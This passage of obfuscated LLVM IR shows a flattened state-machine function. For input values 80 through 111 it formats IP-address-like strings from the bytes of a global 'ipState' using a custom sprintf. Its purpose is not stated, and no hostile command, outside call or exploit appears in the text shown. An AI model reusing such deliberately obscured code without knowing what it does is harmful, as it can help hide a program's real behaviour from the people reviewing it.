  %901 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %902 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %903 = zext i8 %902 to i32
  %904 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %905 = zext i8 %904 to i32
  %906 = call i32 (i8*, i8*, ...) @szprintf(i8* %901, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.119, i32 0, i32 0), i32 %903, i32 %905)
  store i32 -1460997941, i32* %switchVar
  br label %loopEnd

; <label>:907:                                    ; preds = %loopEntry
  %908 = load i32, i32* %1, align 4
  %909 = icmp eq i32 %908, 80
  %910 = select i1 %909, i32 -1446628157, i32 -2125976346
  store i32 %910, i32* %switchVar
  br label %loopEnd

; <label>:911:                                    ; preds = %loopEntry
  %912 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %913 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %914 = zext i8 %913 to i32
  %915 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %916 = zext i8 %915 to i32
  %917 = call i32 (i8*, i8*, ...) @szprintf(i8* %912, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.120, i32 0, i32 0), i32 %914, i32 %916)
  store i32 -2125976346, i32* %switchVar
  br label %loopEnd

; <label>:918:                                    ; preds = %loopEntry
  %919 = load i32, i32* %1, align 4
  %920 = icmp eq i32 %919, 81
  %921 = select i1 %920, i32 1002902248, i32 -525326166
  store i32 %921, i32* %switchVar
  br label %loopEnd

; <label>:922:                                    ; preds = %loopEntry
  %923 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %924 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %925 = zext i8 %924 to i32
  %926 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %927 = zext i8 %926 to i32
  %928 = call i32 (i8*, i8*, ...) @szprintf(i8* %923, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.121, i32 0, i32 0), i32 %925, i32 %927)
  store i32 -525326166, i32* %switchVar
  br label %loopEnd

; <label>:929:                                    ; preds = %loopEntry
  %930 = load i32, i32* %1, align 4
  %931 = icmp eq i32 %930, 82
  %932 = select i1 %931, i32 -737947666, i32 687924486
  store i32 %932, i32* %switchVar
  br label %loopEnd

; <label>:933:                                    ; preds = %loopEntry
  %934 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %935 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %936 = zext i8 %935 to i32
  %937 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %938 = zext i8 %937 to i32
  %939 = call i32 (i8*, i8*, ...) @szprintf(i8* %934, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.122, i32 0, i32 0), i32 %936, i32 %938)
  store i32 687924486, i32* %switchVar
  br label %loopEnd

; <label>:940:                                    ; preds = %loopEntry
  %941 = load i32, i32* %1, align 4
  %942 = icmp eq i32 %941, 83
  %943 = select i1 %942, i32 -1756576000, i32 -1380987550
  store i32 %943, i32* %switchVar
  br label %loopEnd

; <label>:944:                                    ; preds = %loopEntry
  %945 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %946 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %947 = zext i8 %946 to i32
  %948 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %949 = zext i8 %948 to i32
  %950 = call i32 (i8*, i8*, ...) @szprintf(i8* %945, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.123, i32 0, i32 0), i32 %947, i32 %949)
  store i32 -1380987550, i32* %switchVar
  br label %loopEnd

; <label>:951:                                    ; preds = %loopEntry
  %952 = load i32, i32* %1, align 4
  %953 = icmp eq i32 %952, 84
  %954 = select i1 %953, i32 2023966626, i32 -122942446
  store i32 %954, i32* %switchVar
  br label %loopEnd

; <label>:955:                                    ; preds = %loopEntry
  %956 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %957 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %958 = zext i8 %957 to i32
  %959 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %960 = zext i8 %959 to i32
  %961 = call i32 (i8*, i8*, ...) @szprintf(i8* %956, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.124, i32 0, i32 0), i32 %958, i32 %960)
  store i32 -122942446, i32* %switchVar
  br label %loopEnd

; <label>:962:                                    ; preds = %loopEntry
  %963 = load i32, i32* %1, align 4
  %964 = icmp eq i32 %963, 85
  %965 = select i1 %964, i32 1201379484, i32 -1899563941
  store i32 %965, i32* %switchVar
  br label %loopEnd

; <label>:966:                                    ; preds = %loopEntry
  %967 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %968 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %969 = zext i8 %968 to i32
  %970 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %971 = zext i8 %970 to i32
  %972 = call i32 (i8*, i8*, ...) @szprintf(i8* %967, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.125, i32 0, i32 0), i32 %969, i32 %971)
  store i32 -1899563941, i32* %switchVar
  br label %loopEnd

; <label>:973:                                    ; preds = %loopEntry
  %974 = load i32, i32* %1, align 4
  %975 = icmp eq i32 %974, 86
  %976 = select i1 %975, i32 1550719471, i32 -1162528705
  store i32 %976, i32* %switchVar
  br label %loopEnd

; <label>:977:                                    ; preds = %loopEntry
  %978 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %979 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %980 = zext i8 %979 to i32
  %981 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %982 = zext i8 %981 to i32
  %983 = call i32 (i8*, i8*, ...) @szprintf(i8* %978, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.126, i32 0, i32 0), i32 %980, i32 %982)
  store i32 -1162528705, i32* %switchVar
  br label %loopEnd

; <label>:984:                                    ; preds = %loopEntry
  %985 = load i32, i32* %1, align 4
  %986 = icmp eq i32 %985, 87
  %987 = select i1 %986, i32 -1951720048, i32 -867953187
  store i32 %987, i32* %switchVar
  br label %loopEnd

; <label>:988:                                    ; preds = %loopEntry
  %989 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %990 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %991 = zext i8 %990 to i32
  %992 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %993 = zext i8 %992 to i32
  %994 = call i32 (i8*, i8*, ...) @szprintf(i8* %989, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.127, i32 0, i32 0), i32 %991, i32 %993)
  store i32 -867953187, i32* %switchVar
  br label %loopEnd

; <label>:995:                                    ; preds = %loopEntry
  %996 = load i32, i32* %1, align 4
  %997 = icmp eq i32 %996, 88
  %998 = select i1 %997, i32 1832399953, i32 1139878650
  store i32 %998, i32* %switchVar
  br label %loopEnd

; <label>:999:                                    ; preds = %loopEntry
  %1000 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1001 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1002 = zext i8 %1001 to i32
  %1003 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1004 = zext i8 %1003 to i32
  %1005 = call i32 (i8*, i8*, ...) @szprintf(i8* %1000, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.128, i32 0, i32 0), i32 %1002, i32 %1004)
  store i32 1139878650, i32* %switchVar
  br label %loopEnd

; <label>:1006:                                   ; preds = %loopEntry
  %1007 = load i32, i32* %1, align 4
  %1008 = icmp eq i32 %1007, 89
  %1009 = select i1 %1008, i32 1055597666, i32 1931441633
  store i32 %1009, i32* %switchVar
  br label %loopEnd

; <label>:1010:                                   ; preds = %loopEntry
  %1011 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1012 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1013 = zext i8 %1012 to i32
  %1014 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1015 = zext i8 %1014 to i32
  %1016 = call i32 (i8*, i8*, ...) @szprintf(i8* %1011, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.129, i32 0, i32 0), i32 %1013, i32 %1015)
  store i32 1931441633, i32* %switchVar
  br label %loopEnd

; <label>:1017:                                   ; preds = %loopEntry
  %1018 = load i32, i32* %1, align 4
  %1019 = icmp eq i32 %1018, 90
  %1020 = select i1 %1019, i32 152307803, i32 -36859192
  store i32 %1020, i32* %switchVar
  br label %loopEnd

; <label>:1021:                                   ; preds = %loopEntry
  %1022 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1023 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1024 = zext i8 %1023 to i32
  %1025 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1026 = zext i8 %1025 to i32
  %1027 = call i32 (i8*, i8*, ...) @szprintf(i8* %1022, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.130, i32 0, i32 0), i32 %1024, i32 %1026)
  store i32 -36859192, i32* %switchVar
  br label %loopEnd

; <label>:1028:                                   ; preds = %loopEntry
  %1029 = load i32, i32* %1, align 4
  %1030 = icmp eq i32 %1029, 91
  %1031 = select i1 %1030, i32 -1722499790, i32 -641508541
  store i32 %1031, i32* %switchVar
  br label %loopEnd

; <label>:1032:                                   ; preds = %loopEntry
  %1033 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1034 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1035 = zext i8 %1034 to i32
  %1036 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1037 = zext i8 %1036 to i32
  %1038 = call i32 (i8*, i8*, ...) @szprintf(i8* %1033, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.131, i32 0, i32 0), i32 %1035, i32 %1037)
  store i32 -641508541, i32* %switchVar
  br label %loopEnd

; <label>:1039:                                   ; preds = %loopEntry
  %1040 = load i32, i32* %1, align 4
  %1041 = icmp eq i32 %1040, 92
  %1042 = select i1 %1041, i32 -1566972697, i32 947144505
  store i32 %1042, i32* %switchVar
  br label %loopEnd

; <label>:1043:                                   ; preds = %loopEntry
  %1044 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1045 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1046 = zext i8 %1045 to i32
  %1047 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1048 = zext i8 %1047 to i32
  %1049 = call i32 (i8*, i8*, ...) @szprintf(i8* %1044, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i32 0, i32 0), i32 %1046, i32 %1048)
  store i32 947144505, i32* %switchVar
  br label %loopEnd

; <label>:1050:                                   ; preds = %loopEntry
  %1051 = load i32, i32* %1, align 4
  %1052 = icmp eq i32 %1051, 93
  %1053 = select i1 %1052, i32 -263370249, i32 944101528
  store i32 %1053, i32* %switchVar
  br label %loopEnd

; <label>:1054:                                   ; preds = %loopEntry
  %1055 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1056 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1057 = zext i8 %1056 to i32
  %1058 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1059 = zext i8 %1058 to i32
  %1060 = call i32 (i8*, i8*, ...) @szprintf(i8* %1055, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.121, i32 0, i32 0), i32 %1057, i32 %1059)
  store i32 944101528, i32* %switchVar
  br label %loopEnd

; <label>:1061:                                   ; preds = %loopEntry
  %1062 = load i32, i32* %1, align 4
  %1063 = icmp eq i32 %1062, 94
  %1064 = select i1 %1063, i32 5427997, i32 -310429973
  store i32 %1064, i32* %switchVar
  br label %loopEnd

; <label>:1065:                                   ; preds = %loopEntry
  %1066 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1067 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1068 = zext i8 %1067 to i32
  %1069 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1070 = zext i8 %1069 to i32
  %1071 = call i32 (i8*, i8*, ...) @szprintf(i8* %1066, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.133, i32 0, i32 0), i32 %1068, i32 %1070)
  store i32 -310429973, i32* %switchVar
  br label %loopEnd

; <label>:1072:                                   ; preds = %loopEntry
  %1073 = load i32, i32* %1, align 4
  %1074 = icmp eq i32 %1073, 95
  %1075 = select i1 %1074, i32 -781616824, i32 1810869471
  store i32 %1075, i32* %switchVar
  br label %loopEnd

; <label>:1076:                                   ; preds = %loopEntry
  %1077 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1078 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1079 = zext i8 %1078 to i32
  %1080 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1081 = zext i8 %1080 to i32
  %1082 = call i32 (i8*, i8*, ...) @szprintf(i8* %1077, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.134, i32 0, i32 0), i32 %1079, i32 %1081)
  store i32 1810869471, i32* %switchVar
  br label %loopEnd

; <label>:1083:                                   ; preds = %loopEntry
  %1084 = load i32, i32* %1, align 4
  %1085 = icmp eq i32 %1084, 96
  %1086 = select i1 %1085, i32 -58954473, i32 -772561516
  store i32 %1086, i32* %switchVar
  br label %loopEnd

; <label>:1087:                                   ; preds = %loopEntry
  %1088 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1089 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1090 = zext i8 %1089 to i32
  %1091 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1092 = zext i8 %1091 to i32
  %1093 = call i32 (i8*, i8*, ...) @szprintf(i8* %1088, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.135, i32 0, i32 0), i32 %1090, i32 %1092)
  store i32 -772561516, i32* %switchVar
  br label %loopEnd

; <label>:1094:                                   ; preds = %loopEntry
  %1095 = load i32, i32* %1, align 4
  %1096 = icmp eq i32 %1095, 97
  %1097 = select i1 %1096, i32 313727483, i32 257907691
  store i32 %1097, i32* %switchVar
  br label %loopEnd

; <label>:1098:                                   ; preds = %loopEntry
  %1099 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1100 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1101 = zext i8 %1100 to i32
  %1102 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1103 = zext i8 %1102 to i32
  %1104 = call i32 (i8*, i8*, ...) @szprintf(i8* %1099, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.134, i32 0, i32 0), i32 %1101, i32 %1103)
  store i32 257907691, i32* %switchVar
  br label %loopEnd

; <label>:1105:                                   ; preds = %loopEntry
  %1106 = load i32, i32* %1, align 4
  %1107 = icmp eq i32 %1106, 98
  %1108 = select i1 %1107, i32 -532116317, i32 288179423
  store i32 %1108, i32* %switchVar
  br label %loopEnd

; <label>:1109:                                   ; preds = %loopEntry
  %1110 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1111 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1112 = zext i8 %1111 to i32
  %1113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1114 = zext i8 %1113 to i32
  %1115 = call i32 (i8*, i8*, ...) @szprintf(i8* %1110, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.136, i32 0, i32 0), i32 %1112, i32 %1114)
  store i32 288179423, i32* %switchVar
  br label %loopEnd

; <label>:1116:                                   ; preds = %loopEntry
  %1117 = load i32, i32* %1, align 4
  %1118 = icmp eq i32 %1117, 99
  %1119 = select i1 %1118, i32 -980897138, i32 -1440161274
  store i32 %1119, i32* %switchVar
  br label %loopEnd

; <label>:1120:                                   ; preds = %loopEntry
  %1121 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1122 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1123 = zext i8 %1122 to i32
  %1124 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1125 = zext i8 %1124 to i32
  %1126 = call i32 (i8*, i8*, ...) @szprintf(i8* %1121, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.137, i32 0, i32 0), i32 %1123, i32 %1125)
  store i32 -1440161274, i32* %switchVar
  br label %loopEnd

; <label>:1127:                                   ; preds = %loopEntry
  %1128 = load i32, i32* %1, align 4
  %1129 = icmp eq i32 %1128, 100
  %1130 = select i1 %1129, i32 -1213995260, i32 -1341385852
  store i32 %1130, i32* %switchVar
  br label %loopEnd

; <label>:1131:                                   ; preds = %loopEntry
  %1132 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1134 = zext i8 %1133 to i32
  %1135 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1136 = zext i8 %1135 to i32
  %1137 = call i32 (i8*, i8*, ...) @szprintf(i8* %1132, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.138, i32 0, i32 0), i32 %1134, i32 %1136)
  store i32 -1341385852, i32* %switchVar
  br label %loopEnd

; <label>:1138:                                   ; preds = %loopEntry
  %1139 = load i32, i32* %1, align 4
  %1140 = icmp eq i32 %1139, 101
  %1141 = select i1 %1140, i32 329755256, i32 368851842
  store i32 %1141, i32* %switchVar
  br label %loopEnd

; <label>:1142:                                   ; preds = %loopEntry
  %1143 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1144 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1145 = zext i8 %1144 to i32
  %1146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1147 = zext i8 %1146 to i32
  %1148 = call i32 (i8*, i8*, ...) @szprintf(i8* %1143, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.139, i32 0, i32 0), i32 %1145, i32 %1147)
  store i32 368851842, i32* %switchVar
  br label %loopEnd

; <label>:1149:                                   ; preds = %loopEntry
  %1150 = load i32, i32* %1, align 4
  %1151 = icmp eq i32 %1150, 102
  %1152 = select i1 %1151, i32 -598884100, i32 1131381016
  store i32 %1152, i32* %switchVar
  br label %loopEnd

; <label>:1153:                                   ; preds = %loopEntry
  %1154 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1155 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1156 = zext i8 %1155 to i32
  %1157 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1158 = zext i8 %1157 to i32
  %1159 = call i32 (i8*, i8*, ...) @szprintf(i8* %1154, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.140, i32 0, i32 0), i32 %1156, i32 %1158)
  store i32 1131381016, i32* %switchVar
  br label %loopEnd

; <label>:1160:                                   ; preds = %loopEntry
  %1161 = load i32, i32* %1, align 4
  %1162 = icmp eq i32 %1161, 103
  %1163 = select i1 %1162, i32 961258324, i32 -1340615017
  store i32 %1163, i32* %switchVar
  br label %loopEnd

; <label>:1164:                                   ; preds = %loopEntry
  %1165 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1166 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1167 = zext i8 %1166 to i32
  %1168 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1169 = zext i8 %1168 to i32
  %1170 = call i32 (i8*, i8*, ...) @szprintf(i8* %1165, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.141, i32 0, i32 0), i32 %1167, i32 %1169)
  store i32 -1340615017, i32* %switchVar
  br label %loopEnd

; <label>:1171:                                   ; preds = %loopEntry
  %1172 = load i32, i32* %1, align 4
  %1173 = icmp eq i32 %1172, 104
  %1174 = select i1 %1173, i32 -1886930395, i32 706160894
  store i32 %1174, i32* %switchVar
  br label %loopEnd

; <label>:1175:                                   ; preds = %loopEntry
  %1176 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1177 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1178 = zext i8 %1177 to i32
  %1179 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1180 = zext i8 %1179 to i32
  %1181 = call i32 (i8*, i8*, ...) @szprintf(i8* %1176, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.142, i32 0, i32 0), i32 %1178, i32 %1180)
  store i32 706160894, i32* %switchVar
  br label %loopEnd

; <label>:1182:                                   ; preds = %loopEntry
  %1183 = load i32, i32* %1, align 4
  %1184 = icmp eq i32 %1183, 105
  %1185 = select i1 %1184, i32 -11728653, i32 -1206370748
  store i32 %1185, i32* %switchVar
  br label %loopEnd

; <label>:1186:                                   ; preds = %loopEntry
  %1187 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1188 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1189 = zext i8 %1188 to i32
  %1190 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1191 = zext i8 %1190 to i32
  %1192 = call i32 (i8*, i8*, ...) @szprintf(i8* %1187, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.143, i32 0, i32 0), i32 %1189, i32 %1191)
  store i32 -1206370748, i32* %switchVar
  br label %loopEnd

; <label>:1193:                                   ; preds = %loopEntry
  %1194 = load i32, i32* %1, align 4
  %1195 = icmp eq i32 %1194, 106
  %1196 = select i1 %1195, i32 14145800, i32 1538657568
  store i32 %1196, i32* %switchVar
  br label %loopEnd

; <label>:1197:                                   ; preds = %loopEntry
  %1198 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1199 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1200 = zext i8 %1199 to i32
  %1201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1202 = zext i8 %1201 to i32
  %1203 = call i32 (i8*, i8*, ...) @szprintf(i8* %1198, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.144, i32 0, i32 0), i32 %1200, i32 %1202)
  store i32 1538657568, i32* %switchVar
  br label %loopEnd

; <label>:1204:                                   ; preds = %loopEntry
  %1205 = load i32, i32* %1, align 4
  %1206 = icmp eq i32 %1205, 107
  %1207 = select i1 %1206, i32 1811388296, i32 2078146206
  store i32 %1207, i32* %switchVar
  br label %loopEnd

; <label>:1208:                                   ; preds = %loopEntry
  %1209 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1210 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1211 = zext i8 %1210 to i32
  %1212 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1213 = zext i8 %1212 to i32
  %1214 = call i32 (i8*, i8*, ...) @szprintf(i8* %1209, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.145, i32 0, i32 0), i32 %1211, i32 %1213)
  store i32 2078146206, i32* %switchVar
  br label %loopEnd

; <label>:1215:                                   ; preds = %loopEntry
  %1216 = load i32, i32* %1, align 4
  %1217 = icmp eq i32 %1216, 108
  %1218 = select i1 %1217, i32 -1696284198, i32 -1398780441
  store i32 %1218, i32* %switchVar
  br label %loopEnd

; <label>:1219:                                   ; preds = %loopEntry
  %1220 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1222 = zext i8 %1221 to i32
  %1223 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1224 = zext i8 %1223 to i32
  %1225 = call i32 (i8*, i8*, ...) @szprintf(i8* %1220, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i32 0, i32 0), i32 %1222, i32 %1224)
  store i32 -1398780441, i32* %switchVar
  br label %loopEnd

; <label>:1226:                                   ; preds = %loopEntry
  %1227 = load i32, i32* %1, align 4
  %1228 = icmp eq i32 %1227, 109
  %1229 = select i1 %1228, i32 -790497212, i32 -947274809
  store i32 %1229, i32* %switchVar
  br label %loopEnd

; <label>:1230:                                   ; preds = %loopEntry
  %1231 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1232 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1233 = zext i8 %1232 to i32
  %1234 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1235 = zext i8 %1234 to i32
  %1236 = call i32 (i8*, i8*, ...) @szprintf(i8* %1231, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.147, i32 0, i32 0), i32 %1233, i32 %1235)
  store i32 -947274809, i32* %switchVar
  br label %loopEnd

; <label>:1237:                                   ; preds = %loopEntry
  %1238 = load i32, i32* %1, align 4
  %1239 = icmp eq i32 %1238, 110
  %1240 = select i1 %1239, i32 360972582, i32 963885732
  store i32 %1240, i32* %switchVar
  br label %loopEnd

; <label>:1241:                                   ; preds = %loopEntry
  %1242 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1243 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1244 = zext i8 %1243 to i32
  %1245 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1246 = zext i8 %1245 to i32
  %1247 = call i32 (i8*, i8*, ...) @szprintf(i8* %1242, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.148, i32 0, i32 0), i32 %1244, i32 %1246)
  store i32 963885732, i32* %switchVar
  br label %loopEnd

; <label>:1248:                                   ; preds = %loopEntry
  %1249 = load i32, i32* %1, align 4
  %1250 = icmp eq i32 %1249, 111
  %1251 = select i1 %1250, i32 -502790056, i32 -1214640375
  store i32 %1251, i32* %switchVar
  br label %loopEnd

; <label>:1252:                                   ; preds = %loopEntry
  %1253 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1254 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1255 = zext i8 %1254 to i32
  %1256 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1257 = zext i8 %1256 to i32
  %1258 = call i32 (i8*, i8*, ...) @szprintf(i8* %1253, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.134, i32 0, i32 0), i32 %1255, i32 %1257)
  store i32 -1214640375, i32* %switchVar
  br label %loopEnd

; <label>:1259:                                   ; preds = %loopEntry
